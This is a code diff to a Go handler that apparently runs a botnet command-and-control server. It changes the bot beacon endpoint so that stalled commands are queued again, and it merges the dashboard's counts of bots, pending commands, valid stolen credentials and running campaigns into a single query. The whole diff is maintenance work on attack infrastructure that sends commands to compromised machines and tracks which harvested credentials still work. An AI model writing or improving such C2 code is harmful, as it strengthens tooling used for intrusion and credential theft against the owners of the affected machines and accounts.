@@ -97,6 +97,8 @@ func (h *BotHandler) AgentBeacon(c *fiber.Ctx) error {
 		return c.Status(404).JSON(fiber.Map{"error": "bot not found"})
 	}
 
+	h.db.Exec(`UPDATE commands SET status = 'pending' WHERE bot_id = $1 AND status = 'executing' AND created_at < NOW() - INTERVAL '10 minutes'`, botID)
+
 	var pendingCount int
 	h.db.QueryRow(`SELECT COUNT(*) FROM commands WHERE bot_id = $1 AND status = 'pending'`, botID).Scan(&pendingCount)
 
@@ -196,12 +198,18 @@ func (h *BotHandler) RefreshToken(c *fiber.Ctx) error {
 func (h *BotHandler) Stats(c *fiber.Ctx) error {
 	var totalBots, activeBots, pendingCmds, validCreds, activeCampaigns, totalCampaigns int
 
-	h.db.QueryRow(`SELECT COUNT(*) FROM bots`).Scan(&totalBots)
-	h.db.QueryRow(`SELECT COUNT(*) FROM bots WHERE status = 'active' AND last_seen > NOW() - INTERVAL '5 minutes'`).Scan(&activeBots)
-	h.db.QueryRow(`SELECT COUNT(*) FROM commands WHERE status = 'pending'`).Scan(&pendingCmds)
-	h.db.QueryRow(`SELECT COUNT(*) FROM credentials WHERE valid = true`).Scan(&validCreds)
-	h.db.QueryRow(`SELECT COUNT(*) FROM campaigns WHERE status = 'running'`).Scan(&activeCampaigns)
-	h.db.QueryRow(`SELECT COUNT(*) FROM campaigns`).Scan(&totalCampaigns)
+	err := h.db.QueryRow(`
+		SELECT
+			(SELECT COUNT(*) FROM bots),
+			(SELECT COUNT(*) FROM bots WHERE status = 'active' AND last_seen > NOW() - INTERVAL '5 minutes'),
+			(SELECT COUNT(*) FROM commands WHERE status = 'pending'),
+			(SELECT COUNT(*) FROM credentials WHERE valid = true),
+			(SELECT COUNT(*) FROM campaigns WHERE status = 'running'),
+			(SELECT COUNT(*) FROM campaigns)
+	`).Scan(&totalBots, &activeBots, &pendingCmds, &validCreds, &activeCampaigns, &totalCampaigns)
+	if err != nil {
+		return c.Status(500).JSON(fiber.Map{"error": "failed to get stats"})
+	}
 
 	return c.JSON(fiber.Map{
 		"total_bots":        totalBots,
